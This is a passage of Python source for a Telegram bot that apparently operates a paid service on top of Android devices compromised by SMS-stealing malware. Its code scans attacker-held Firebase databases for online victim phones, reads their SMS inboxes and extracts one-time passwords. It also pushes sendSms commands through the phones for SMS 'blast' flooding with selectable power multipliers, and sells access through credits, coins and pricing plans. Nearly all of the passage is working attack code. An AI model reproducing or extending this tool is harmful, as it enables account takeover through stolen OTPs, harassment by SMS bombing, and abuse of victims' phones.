        except Exception:
            pass
        return await handler(event, data)

# ============================================================
#  FSM STATES
# ============================================================
class S(StatesGroup):
    # user send
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    # owner send
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    # admin send
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    # firebase
    add_firebase = State()
    add_firebase_file = State()
    # owners/admins
    add_owner = State()
    add_admin = State()
    ban_user = State()
    ban_user_reason = State()
    broadcast = State()
    broadcast_target = State()
    # force join
    fj_add_channel = State()
    fj_add_link = State()
    fj_add_bypass = State()
    # pricing
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_coins = State()
    add_plan_currency = State()
    add_plan_link = State()
    # credits
    add_credits_amount = State()
    deduct_credits_amount = State()
    add_coins_amount = State()
    deduct_coins_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_all_coins_amount = State()
    deduct_all_coins_amount = State()
    # redeem
    redeem_code = State()
    gen_redeem_currency = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    # settings
    set_ref_credits = State()
    set_ref_coins = State()
    set_otp_cost = State()
    set_otp_fresh = State()
    set_daily_bonus = State()
    owner_edit_name = State()
    # limits
    set_limit_uid = State()
    set_limit_value = State()
    set_otp_limit_uid = State()
    set_otp_limit_value = State()
    # protected
    protect_number = State()
    track_number = State()
    # transfer
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    transfer_coins_uid = State()
    transfer_coins_amount = State()
    # videos
    add_video = State()
    # search
    user_search = State()
    # notes/tags
    user_note_uid = State()
    user_note_text = State()
    user_tag_uid = State()
    user_tag_text = State()
    # direct message
    direct_msg_uid = State()
    direct_msg_text = State()
    # templates
    template_name = State()
    template_text = State()
    # scheduled
    sched_number = State()
    sched_message = State()
    sched_count = State()
    sched_time = State()
    # device search
    device_search = State()
    # otp watch
    otp_watch_uid = State()
    otp_watch_keyword = State()
    # coin gift
    gift_coins_uid = State()
    gift_coins_amount = State()
    # maintenance msg
    set_maint_msg = State()

# ============================================================
#  USER SESSION (blast)
# ============================================================
class UserSession:
    __slots__ = ("uid", "cancelled", "sent", "failed", "task",
                 "start_time", "lock", "number", "blast_data")
    def __init__(self, uid):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.blast_data = None

# ═══════════════════════════════════════════════════════════
#  END OF PART 1  —  paste PART 2 right after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 2 START  —  FIREBASE / SMS SEND / OTP / SCANNER
# ============================================================

# ============================================================
#  FIREBASE — core HTTP
# ============================================================
async def fb_put(base_url, path, payload, timeout_sec=6):
    """PUT json to firebase path. Returns True on 2xx."""
    url = base_url.rstrip("/") + path
    try:
        sess = await get_http_session()
        for attempt in range(2):
            try:
                async with sess.put(
                    url, json=payload,
                    timeout=aiohttp.ClientTimeout(total=timeout_sec)
                ) as r:
                    if 200 <= r.status < 300:
                        return True
            except Exception:
                pass
            await asyncio.sleep(0.25 * (attempt + 1))
    except Exception:
        pass
    return False

async def fb_get_raw(base_url, path, timeout_sec=8):
    """Return (ok, data_or_err)."""
    url = base_url.rstrip("/") + path
    try:
        sess = await get_http_session()
        async with sess.get(
            url, timeout=aiohttp.ClientTimeout(total=timeout_sec)
        ) as r:
            txt = (await r.text()).strip()
            if r.status == 200:
                if txt == "null" or not txt:
                    return False, None
                try:
                    return True, json.loads(txt)
                except Exception:
                    return True, txt
            return False, f"HTTP {r.status}"
    except asyncio.TimeoutError:
        return False, "timeout"
    except Exception as e:
        return False, str(e)[:60]

async def fb_get(base_url, path):
    ok, data = await fb_get_raw(base_url, path)
    if not ok:
        return None
    return data

# ============================================================
#  FIREBASE — device helpers
# ============================================================
def device_is_online(dd):
    if not isinstance(dd, dict):
        return False
    # explicit truthy fields
    for k in ("isOnline", "online", "connected", "active"):
        v = dd.get(k)
        if v is True or v == 1 or (isinstance(v, str) and v.lower() in ("true", "yes", "1")):
            return True
    # status string
    st = dd.get("status")
    if isinstance(st, bool) and st:
        return True
    if isinstance(st, str) and st.lower() in ("online", "active", "connected", "1"):
        return True
    # lastSeen within 60s → treat as online
    ls = dd.get("lastSeen") or dd.get("last_seen") or dd.get("lastOnline")
    try:
        if ls:
            iv = int(ls)
            if iv > 10_000_000_000:
                iv = iv // 1000
            if now_ts() - iv < 60:
                return True
    except Exception:
        pass
    return False

def _extract_phone_from_obj(obj):
    if not isinstance(obj, dict):
        return None
    keys = (
        "phoneNumber", "phone", "number", "msisdn", "simNumber",
        "phone_number", "PhoneNumber", "Phone", "simPhone",
    )
    kl = [k.lower() for k in keys]
    for k, v in obj.items():
        if k.lower() in kl and v:
            sv = str(v).strip()
            if sv and len(sv) >= 7:
                return sv
    return None

def device_phone(dd):
    if not isinstance(dd, dict):
        return None
    v = _extract_phone_from_obj(dd)
    if v:
        return v
    # sims array
    sims = dd.get("sims") or dd.get("sim") or dd.get("simCards")
    if isinstance(sims, dict):
        sims = list(sims.values())
    if isinstance(sims, list):
        for s in sims:
            v = _extract_phone_from_obj(s)
            if v:
                return v
    # device obj
    dev = dd.get("device") or dd.get("deviceInfo")
    if isinstance(dev, dict):
        v = _extract_phone_from_obj(dev)
        if v:
            return v
    return None

def device_sim_slots(dd):
    if not isinstance(dd, dict):
        return [0]
    sims = dd.get("sims") or dd.get("sim") or []
    if isinstance(sims, dict):
        sims = list(sims.values())
    out = []
    for s in sims:
        if isinstance(s, dict):
            idx = s.get("simSlotIndex") or s.get("slot") or s.get("slotIndex")
            try:
                out.append(int(idx))
            except Exception:
                out.append(0)
    if not out:
        out = [0]
    return out

def device_name(dd):
    if not isinstance(dd, dict):
        return "unknown"
    for k in ("deviceName", "name", "model", "device", "brand"):
        v = dd.get(k)
        if isinstance(v, str) and v.strip():
            return v.strip()[:64]
    return "device"

# ============================================================
#  FIREBASE — scan one firebase
# ============================================================
async def _fetch_fb(sess, fb, dev_sem, results):
    url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
    try:
        async with sess.get(url) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                if txt == "null" or not txt:
                    FB_SCAN_ERRORS.pop(fb["id"], None)
                    return
                try:
                    ids = json.loads(txt)
                except Exception:
                    FB_SCAN_ERRORS.pop(fb["id"], None)
                    return
                if not isinstance(ids, dict):
                    FB_SCAN_ERRORS.pop(fb["id"], None)
                    return

                async def fd(dev_id):
                    try:
                        u = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                        async with dev_sem:
                            async with sess.get(u) as r2:
                                if r2.status == 200:
                                    t2 = (await r2.text()).strip()
                                    if t2 == "null" or not t2:
                                        return None
                                    try:
                                        dd = json.loads(t2)
                                    except Exception:
                                        return None
                                    if isinstance(dd, dict) and device_is_online(dd):
                                        return {
                                            "fb_id": fb["id"],
                                            "fb_url": fb["url"],
                                            "fb_label": fb.get("label", fb["url"][:30]),
                                            "dev_id": dev_id,
                                            "dev_name": device_name(dd),
                                            "phone": device_phone(dd),
                                            "sims": dd.get("sims", []) or dd.get("sim", []),
                                            "raw": dd,
                                            "last_scan": now_ts(),
                                        }
                    except Exception:
                        pass
                    return None

                dev_ids = list(ids.keys())
                for i in range(0, len(dev_ids), _DEVICE_BATCH):
                    batch = dev_ids[i:i + _DEVICE_BATCH]
                    rs = await asyncio.gather(*(fd(d) for d in batch), return_exceptions=True)
                    for x in rs:
                        if x and isinstance(x, dict):
                            results.append(x)
                FB_SCAN_ERRORS.pop(fb["id"], None)
                return
            elif r.status in (401, 403):
                FB_SCAN_ERRORS[fb["id"]] = f"AUTH {r.status}"
                return
            elif r.status == 404:
                FB_SCAN_ERRORS[fb["id"]] = "404"
                return
            elif r.status in (429, 500, 502, 503, 504):
                FB_SCAN_ERRORS[fb["id"]] = f"RATE {r.status}"
                return
            else:
                FB_SCAN_ERRORS[fb["id"]] = f"HTTP {r.status}"
                return
    except asyncio.TimeoutError:
        FB_SCAN_ERRORS[fb["id"]] = "TIMEOUT"
        return
    except aiohttp.ClientError as e:
        FB_SCAN_ERRORS[fb["id"]] = f"CLIENT {str(e)[:25]}"
        return
    except Exception as e:
        FB_SCAN_ERRORS[fb["id"]] = f"ERR {str(e)[:25]}"
        return

# ============================================================
#  FIREBASE — scan all
# ============================================================
async def scan_all(d):
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    curr = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [x for x in CACHED_DEVICES if x.get("fb_id") in curr]
    for sid in list(FB_SCAN_ERRORS.keys()):
        if sid not in curr:
            FB_SCAN_ERRORS.pop(sid, None)

    fb_sem = asyncio.Semaphore(_FB_CONCURRENCY)
    dev_sem = asyncio.Semaphore(_DEV_CONCURRENCY)
    conn = aiohttp.TCPConnector(
        limit=_HTTP_POOL_LIMIT,
        limit_per_host=_HTTP_PER_HOST,
        ttl_dns_cache=_DNS_CACHE_TTL,
        force_close=False,
        enable_cleanup_closed=True,
    )
    to = aiohttp.ClientTimeout(total=_HTTP_READ_TIMEOUT, connect=_HTTP_CONNECT_TIMEOUT)
    async with aiohttp.ClientSession(connector=conn, timeout=to) as s:
        async def w(fb):
            async with fb_sem:
                await _fetch_fb(s, fb, dev_sem, results)
        await asyncio.gather(*(w(fb) for fb in fbs), return_exceptions=True)
    return results

# ============================================================
#  SMS SEND — EXACT WORKING FORMAT (3-attempt)
# ============================================================
async def sms_via_device(fb_url, dev_id, sim_slot, to, message):
    ts = int(time.time())
    to_s = str(to).strip()
    msg_s = str(message).strip()
    attempts = [
        (
            f"/clients/{dev_id}/webhookEvent/sendSms.json",
            {"from": sim_slot, "to": to_s, "message": msg_s, "isSended": False, "timestamp": ts},
        ),
        (
            f"/clients/{dev_id}/webhookEvent/sendSms.json",
            {"from": str(sim_slot), "to": to_s, "message": msg_s, "isSended": False, "timestamp": ts},
        ),
        (
            f"/clients/{dev_id}/messages.json",
            {"phone": to_s, "text": msg_s, "sim": sim_slot, "timestamp": ts},
        ),
    ]
    for path, payload in attempts:
        if await fb_put(fb_url, path, payload):
            return True
    return False

# ============================================================
#  OTP — extraction + parsing
# ============================================================
def extract_otp(text):
    """Return list of (code, score) sorted by confidence desc."""
    if not text:
        return []
    txt = str(text)
    lower = txt.lower()
    has_kw = any(k in lower for k in _OTP_KEYWORDS)
    found = []
    for m in _OTP_REGEX.finditer(txt):
        code = m.group()
        score = 0
        if has_kw:
            score += 4
        if len(code) == 6:
            score += 3
        elif len(code) == 4:
            score += 2
        elif len(code) == 5:
            score += 1
        elif len(code) == 8:
            score += 1
        # context: OTP near code
        start = max(0, m.start() - 30)
        ctx = lower[start:m.start()]
        if any(k in ctx for k in _OTP_KEYWORDS):
            score += 2
        found.append((code, score))
    found.sort(key=lambda x: -x[1])
    seen = set()
    out = []
    for c, s in found:
        if c in seen:
            continue
        seen.add(c)
        out.append((c, s))
    return out

def _msg_paths(dev_id):
    """All plausible message-list paths for firebase device."""
    return [
        f"/clients/{dev_id}/messages.json",
        f"/clients/{dev_id}/sms.json",
        f"/clients/{dev_id}/inbox.json",
        f"/clients/{dev_id}/smsList.json",
        f"/clients/{dev_id}/receivedSms.json",
        f"/clients/{dev_id}/received.json",
        f"/clients/{dev_id}/webhookEvent/messages.json",
        f"/clients/{dev_id}/webhookEvent/sms.json",
        f"/messages/{dev_id}.json",
        f"/sms/{dev_id}.json",
        f"/inbox/{dev_id}.json",
        f"/devices/{dev_id}/messages.json",
        f"/devices/{dev_id}/sms.json",
        f"/received/{dev_id}.json",
    ]

def _get_ci(payload, *keys):
    """Case-insensitive get first matching key."""
    if not isinstance(payload, dict):
        return None
    kls = [k.lower() for k in keys]
    for k, v in payload.items():
        if k.lower() in kls:
            return v
    return None

def parse_sms_payload(msg_id, payload):
    if not isinstance(payload, dict):
        return None
    body = _get_ci(
        payload,
        "body", "message", "text", "msg", "content", "sms", "smsBody",
        "bodyText", "MessageBody", "Body", "Message", "Text",
    )
    sender = _get_ci(
        payload,
        "address", "sender", "from", "originator", "phone", "phoneNumber",
        "senderAddress", "From", "Sender", "Address",
    )
    ts = _get_ci(
        payload,
        "date", "timestamp", "time", "receivedAt", "createdAt",
        "receivedDate", "dateTime", "Date", "Timestamp", "Time",
    )
    try:
        ts = int(ts) if ts is not None else 0
    except Exception:
        ts = 0
    if ts > 10_000_000_000:
        ts = ts // 1000
    if not body:
        return None
    return {
        "id": str(msg_id),
        "body": str(body),
        "sender": str(sender) if sender else "Unknown",
        "ts": ts or now_ts(),
    }

async def fb_read_messages(fb_url, dev_id):
    """Try many paths, dedupe by msg_id."""
    all_msgs = []
    for p in _msg_paths(dev_id):
        data = await fb_get(fb_url, p)
        if not data:
            continue
        msgs = []
        if isinstance(data, dict):
            keys_lower = {k.lower() for k in data.keys()}
            looks_like_msg = any(
                k in keys_lower
                for k in ("body", "message", "text", "msg", "content", "address", "sender")
            )
            if looks_like_msg:
                msgs.append((str(int(time.time() * 1000)), data))
            else:
                for k, v in data.items():
                    if isinstance(v, dict):
                        msgs.append((str(k), v))
        elif isinstance(data, list):
            for i, v in enumerate(data):
                if isinstance(v, dict):
                    msgs.append((str(i), v))
        if msgs:
            all_msgs.extend(msgs)
    seen = set()
    out = []
    for mid, pl in all_msgs:
        if mid in seen:
            continue
        seen.add(mid)
        out.append((mid, pl))
    return out

# ============================================================
#  OTP — collect all + collect fresh
# ============================================================
async def collect_all_messages(device, limit=_OTP_MAX_SCAN):
    """Return all messages with metadata (no time filter)."""
    msgs = await fb_read_messages(device["fb_url"], device["dev_id"])
    out = []
    for mid, payload in msgs[:limit]:
        parsed = parse_sms_payload(mid, payload)
        if not parsed:
            continue
        otps = extract_otp(parsed["body"])
        out.append({
            "msg_id": parsed["id"],
            "sender": parsed["sender"],
            "body": parsed["body"],
            "ts": parsed["ts"],
            "otps": [o[0] for o in otps[:3]],
            "has_otp": len(otps) > 0,
        })
    out.sort(key=lambda x: -x["ts"])
    return out

async def collect_fresh_otps(device, fresh_secs=None, limit=_OTP_MAX_SCAN):
    """Return only fresh OTPs (ts >= now - fresh_secs)."""
    if fresh_secs is None:
        d = load()
        fresh_secs = get_otp_fresh_window(d)
    cutoff = now_ts() - int(fresh_secs)
    all_msgs = await collect_all_messages(device, limit=limit)
    fresh = [m for m in all_msgs if m["has_otp"] and m["ts"] >= cutoff]
    return fresh, all_msgs

# ============================================================
#  FIREBASE IMPORT — URL detect + validate + batch
# ============================================================
def extract_urls(text):
    if not text:
        return []
    urls = _URL_REGEX.findall(str(text))
    seen = set()
    out = []
    for u in urls:
        u = u.rstrip(".,;:!?)]}\"'")
        if not u:
            continue
        try:
            parsed = urlparse(u)
            host = (parsed.netloc or "").lower()
            if not host:
                continue
            if "t.me" in host or "telegram" in host:
                continue
            if "github.com" in host or "githubusercontent" in host:
                continue
        except Exception:
            continue
        if u in seen:
            continue
        seen.add(u)
        out.append(u)
    return out

async def check_firebase_url(url):
    """Return (ok, note)."""
    url = url.rstrip("/")
    sess = await get_http_session()
    try:
        async with sess.get(
            url + "/.json",
            timeout=aiohttp.ClientTimeout(total=8)
        ) as r:
            if r.status == 200:
                return True, "ok"
            if r.status == 401:
                return False, "auth required"
            if r.status == 403:
                return False, "forbidden"
            if r.status == 404:
                return False, "not found"
            return False, f"HTTP {r.status}"
    except asyncio.TimeoutError:
        return False, "timeout"
    except Exception as e:
        return False, str(e)[:40]

async def _do_fb_batch(bot, uid):
    b = _FB_UPLOAD_BATCH.pop(uid, None)
    if not b:
        return
    files = b.get("files", [])
    chat_id = b.get("chat_id")
    d = load()

    total_urls = []
    seen = set()
    file_stats = []
    for fname, content in files:
        urls = extract_urls(content)
        file_stats.append((fname, len(urls)))
        for u in urls:
            if u in seen:
                continue
            seen.add(u)
            total_urls.append(u)

    existing_urls = {fb["url"].rstrip("/") for fb in d.get("firebases", [])}

    added = 0
    skipped = 0
    failed = 0
    added_list = []
    failed_list = []

    for url in total_urls:
        if url.rstrip("/") in existing_urls:
            skipped += 1
            continue
        ok, note = await check_firebase_url(url)
        if not ok:
            failed += 1
            failed_list.append((url, note))
            continue
        fbs = d.get("firebases", [])
        existing_ids = {fb["id"] for fb in fbs}
        fid = str(int(time.time() * 1000) + random.randint(100, 9999))
        while fid in existing_ids:
            fid = str(int(time.time() * 1000) + random.randint(100, 9999))
        try:
            host = urlparse(url).netloc or url
        except Exception:
            host = url
        label = host[:30]
        fbs.append({
            "id": fid,
            "url": url.rstrip("/"),
            "label": label,
            "added_at": now_ts(),
        })
        d["firebases"] = fbs
        existing_urls.add(url.rstrip("/"))
        added += 1
        added_list.append(url)

    save()

    lines = [f"{em(EMOJI_FILE, '📁')} <b>File Import Result</b>\n"]
    lines.append(f"📄 Files: <b>{len(files)}</b>")
    for fname, cnt in file_stats:
        lines.append(f"   • <code>{esc(fname[:30])}</code> — <b>{cnt}</b> links")
    lines.append("")
    lines.append(f"🔗 URLs found: <b>{len(total_urls)}</b>")
    lines.append(f"{em(EMOJI_CHECK, '✅')} Added: <b>{added}</b>")
    lines.append(f"{em(EMOJI_WARNING, '⚠️')} Skipped: <b>{skipped}</b>")
    lines.append(f"{em(EMOJI_CROSS, '❌')} Failed: <b>{failed}</b>")
    if added_list:
        lines.append("")
        lines.append("<b>Added:</b>")
        for u in added_list[:8]:
            lines.append(f"   ✅ <code>{esc(u[:60])}</code>")
        if len(added_list) > 8:
            lines.append(f"   <i>+{len(added_list) - 8} more</i>")
    if failed_list:
        lines.append("")
        lines.append("<b>Failed:</b>")
        for u, r in failed_list[:5]:
            lines.append(f"   ❌ <code>{esc(u[:40])}</code> — {esc(r)}")
    lines.append(f"\n{em(EMOJI_FIRE, '🔥')} Total: <b>{len(d.get('firebases', []))}</b>")

    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"

    try:
        await bot.send_message(
            chat_id, txt,
            reply_markup=kb(
                (sc("view firebases"), "owner:fb:menu:0"),
                (sc("back"), "owner:home"),
            ),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception:
        pass

async def _fb_batch_worker(bot, uid):
    try:
        await asyncio.sleep(_FB_UPLOAD_WAIT)
    except asyncio.CancelledError:
        return
    await _do_fb_batch(bot, uid)

# ============================================================
#  SCANNER LOOP (adaptive interval)
# ============================================================
def _adaptive_scan_interval():
    """Shorter interval when recent activity, longer when idle."""
    idle = time.time() - LAST_ACTIVITY_TS
    if idle < 60:
        return _SCAN_ADAPTIVE_MIN
    if idle < 300:
        return 10
    return _SCAN_ADAPTIVE_MAX

async def scanner_loop(bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, LAST_SCAN_DURATION, SCANNING_IN_PROGRESS
    global LAST_KNOWN_DEVICE_COUNT, LAST_KNOWN_FB_COUNTS, DEVICE_HEALTH_LOG

    log.info("[SCANNER] started")
    first_done = False
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                need_wait = True
            else:
                need_wait = False
                SCANNING_IN_PROGRESS = True
        if need_wait:
            await asyncio.sleep(2)
            continue

        start = time.time()
        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await scan_all(d)
            dur = time.time() - start
            CACHED_DEVICES = devices
            LAST_SCAN_DURATION = dur

            if len(devices) > 0:
                new_counts = {}
                for fb in fbs:
                    fid = fb["id"]
                    online = sum(1 for x in devices if x["fb_id"] == fid)
                    new_counts[fid] = {
                        "label": fb.get("label", fb["url"][:30]),
                        "online": online,
                        "last_update": now_ts(),
                    }
                FB_DEVICE_COUNTS.clear()
                FB_DEVICE_COUNTS.update(new_counts)
                LAST_KNOWN_FB_COUNTS = dict(new_counts)
                LAST_KNOWN_DEVICE_COUNT = len(devices) * CURRENT_POWER_MODE
                LAST_SCAN_TIME = time.time()

            # update firebase health
            try:
                fh = d.setdefault("firebase_health", {})
                for fb in fbs:
                    fid = fb["id"]
                    h = fh.setdefault(fid, {
                        "ok": 0, "fail": 0, "last_ok_ts": 0, "last_fail_ts": 0,
                        "avg_response_ms": 0,
                    })
                    if fid in FB_SCAN_ERRORS:
                        h["fail"] = h.get("fail", 0) + 1
                        h["last_fail_ts"] = now_ts()
                        h["last_error"] = FB_SCAN_ERRORS[fid]
                    else:
                        h["ok"] = h.get("ok", 0) + 1
                        h["last_ok_ts"] = now_ts()
            except Exception:
                pass

            DEVICE_HEALTH_LOG.append({
                "timestamp": now_ts(),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(dur, 2),
                "errors": len(FB_SCAN_ERRORS),
                "status": "healthy" if devices else "no_devices",
            })
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            log.info(f"[SCAN] {len(devices)} devices | {dur:.1f}s | err={len(FB_SCAN_ERRORS)}")

            if devices and not first_done:
                try:
                    await bot.send_message(
                        MAIN_OWNER,
                        f"{em(EMOJI_ROCKET, '🚀')} <b>SCANNER ACTIVE</b>\n\n"
                        f"📱 Devices: <b>{len(devices)}</b>\n"
                        f"🔥 APIs: <b>{len(devices) * CURRENT_POWER_MODE}</b>\n"
                        f"🔢 Mode: <b>{CURRENT_POWER_MODE}x</b>\n"
                        f"⏱ Time: <b>{dur:.1f}s</b>\n"
                        f"❌ Errors: <b>{len(FB_SCAN_ERRORS)}</b>",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
                first_done = True
        except Exception as e:
            log.error(f"[SCAN] fatal: {e}", exc_info=True)
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        gap = _adaptive_scan_interval()
        elapsed = time.time() - start
        wait = max(1.0, gap - elapsed)
        await asyncio.sleep(wait)

# ═══════════════════════════════════════════════════════════
#  END OF PART 2  —  paste PART 3 right after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 3 START  —  KEYBOARDS / PANELS / BACKGROUND / BLAST
# ============================================================

# ============================================================
#  SPEED / STOP KEYBOARDS
# ============================================================
def speed_kb(prefix):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("fast", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="danger"),
            btn("medium", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("slow", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="success"),
        ],
        [btn("cancel", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")],
    ])

def stop_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("stop sending", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

def power_row():
    return [
        btn("2x", "owner:set_power:2", EMOJI_ROCKET, "🚀",
            style="success" if CURRENT_POWER_MODE == 2 else "primary"),
        btn("3x", "owner:set_power:3", EMOJI_FIRE, "🔥",
            style="success" if CURRENT_POWER_MODE == 3 else "primary"),
        btn("4x", "owner:set_power:4", EMOJI_FIRE, "💥",
            style="success" if CURRENT_POWER_MODE == 4 else "primary"),
        btn("5x", "owner:set_power:5", EMOJI_FIRE, "💣",
            style="success" if CURRENT_POWER_MODE == 5 else "primary"),
        btn("10x", "owner:set_power:10", EMOJI_FIRE, "☠️",
            style="danger" if CURRENT_POWER_MODE == 10 else "primary"),
    ]

# ============================================================
#  OWNER PANEL KEYBOARD
# ============================================================
def owner_kb(d):
    maint = d.get("settings", {}).get("maintenance", False)
    maint_lbl = f"🔧 {sc('maintenance: ON')}" if maint else f"🔧 {sc('maintenance: OFF')}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("send sms", "owner:send", EMOJI_ROCKET, "📤", style="success"),
            btn("get otp", "user:otp:menu", EMOJI_OTP, "🔐", style="primary"),
        ],
        [
            btn("manage firebase", "owner:fb:menu:0", EMOJI_FIRE, "🔥", style="primary"),
            btn("manage videos", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
        ],
        [
            btn("manage users", "owner:users:list", EMOJI_USER, "👥", style="primary"),
            btn("search user", "owner:users:search", EMOJI_SEARCH, "🔎", style="primary"),
        ],
        [
            btn("add credits", "owner:credits:add_pick", EMOJI_MONEY, "💰", style="success"),
            btn("add coins", "owner:coins:add_pick", EMOJI_COIN, "🪙", style="success"),
        ],
        [
            btn("deduct credits", "owner:credits:deduct_pick", EMOJI_MINUS, "💸", style="danger"),
            btn("deduct coins", "owner:coins:deduct_pick", EMOJI_MINUS, "🪙", style="danger"),
        ],
        [
            btn("add to all", "owner:add_all_credits", EMOJI_PLUS, "➕", style="primary"),
            btn("deduct all", "owner:deduct_all_credits", EMOJI_MINUS, "➖", style="danger"),
        ],
        [
            btn("manage owners", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary"),
            btn("manage admins", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary"),
        ],
        [
            btn("ban user", "owner:ban", EMOJI_CROSS, "🚫", style="danger"),
            btn("unban user", "owner:unban:menu", EMOJI_CHECK, "✅", style="success"),
        ],
        [
            btn("broadcast", "owner:broadcast", EMOJI_BELL, "📢", style="primary"),
            btn("api stats", "owner:stats", EMOJI_CHART, "📊", style="primary"),
        ],
        [
            btn("activity log", "owner:activity", EMOJI_GEAR, "📜", style="primary"),
            btn("audit log", "owner:audit", EMOJI_LOCK, "🔐", style="primary"),
        ],
        [
            btn("pricing plans", "owner:pricing:menu", EMOJI_MONEY, "💳", style="primary"),
            btn("redeem codes", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="primary"),
        ],
        [
            btn("set limit", "owner:set_limit", EMOJI_LOCK, "🔒", style="danger"),
            btn("set otp limit", "owner:set_otp_limit", EMOJI_OTP, "🔐", style="danger"),
        ],
        [
            btn("view limits", "owner:list_limits", EMOJI_LOCK, "📋", style="primary"),
            btn("force join", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary"),
        ],
        [
            btn("sms history", "owner:sms_history", EMOJI_STAR, "📋", style="primary"),
            btn("otp history", "owner:otp_history", EMOJI_OTP, "🔐", style="primary"),
        ],
        [
            btn("firebase health", "owner:fbhealth", EMOJI_CHART, "💊", style="primary"),
            btn("coin ledger", "owner:coin_ledger", EMOJI_COIN, "🪙", style="primary"),
        ],
        [
            btn("templates", "owner:templates:menu", EMOJI_FILE, "📝", style="primary"),
            btn("scheduled", "owner:scheduled:menu", EMOJI_CLOCK, "⏰", style="primary"),
        ],
        [
            btn("support tickets", "owner:tickets:menu", EMOJI_BELL, "📩", style="primary"),
            btn("appeals", "owner:appeals:menu", EMOJI_USER, "🔓", style="primary"),
        ],
        [
            btn("announcements", "owner:announce:menu", EMOJI_BELL, "📣", style="primary"),
            btn("user groups", "owner:groups:menu", EMOJI_USER, "👥", style="primary"),
        ],
        [
            btn("export script", "owner:export_script", EMOJI_GEAR, "📤", style="primary"),
            btn("settings", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"),
        ],
        [
            btn("protect number", "owner:protect", EMOJI_LOCK, "🔒", style="danger"),
            btn("protected list", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary"),
        ],
        [
            btn("track number", "owner:track", EMOJI_STAR, "📊", style="primary"),
            btn("edit owner name", "owner:edit_name", EMOJI_CROWN, "✏️", style="primary"),
        ],
        [
            btn("github sync", "owner:gh:sync", EMOJI_FILE, "📤", style="primary"),
            btn("restore", "owner:gh:restore", EMOJI_FILE, "📥", style="danger"),
        ],
        [InlineKeyboardButton(text=maint_lbl, callback_data="owner:toggle_maint")],
        [btn(f"🎚️ POWER MODE: {CURRENT_POWER_MODE}x — TAP TO CHANGE", "noop", None, "", style="success")],
        power_row(),
        [btn("refresh", "owner:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

# ============================================================
#  ADMIN PANEL KEYBOARD
# ============================================================
def admin_kb(d):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("send sms", "admin:send", EMOJI_ROCKET, "📤", style="success"),
            btn("get otp", "user:otp:menu", EMOJI_OTP, "🔐", style="primary"),
        ],
        [
            btn("manage videos", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
            btn("view users", "admin:users:list", EMOJI_USER, "👥", style="primary"),
        ],
        [
            btn("api stats", "admin:stats", EMOJI_CHART, "📊", style="primary"),
            btn("broadcast", "admin:broadcast", EMOJI_BELL, "📢", style="primary"),
        ],
        [
            btn("ban user", "admin:ban", EMOJI_CROSS, "🚫", style="danger"),
            btn("unban user", "admin:unban:menu", EMOJI_CHECK, "✅", style="success"),
        ],
        [btn("refresh", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

# ============================================================
#  USER PANEL KEYBOARD
# ============================================================
def user_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("send sms", "user:send", EMOJI_ROCKET, "📤", style="success")],
        [btn("get otp", "user:otp:menu", EMOJI_OTP, "🔐", style="primary")],
        [
            btn("my wallet", "user:wallet", EMOJI_MONEY, "💳", style="primary"),
            btn("videos", "user:random_video", EMOJI_VIDEO, "📹", style="primary"),
        ],
        [
            btn("redeem", "user:redeem", EMOJI_GIFT, "🎁", style="primary"),
            btn("refer", "user:refer", EMOJI_USER, "👥", style="primary"),
        ],
        [
            btn("stats", "user:stats", EMOJI_CHART, "📊", style="primary"),
            btn("my history", "user:sms_history", EMOJI_CLOCK, "📜", style="primary"),
        ],
        [
            btn("otp history", "user:otp_history", EMOJI_OTP, "🔐", style="primary"),
            btn("daily bonus", "user:daily_bonus", EMOJI_GIFT, "🎁", style="success"),
        ],
        [
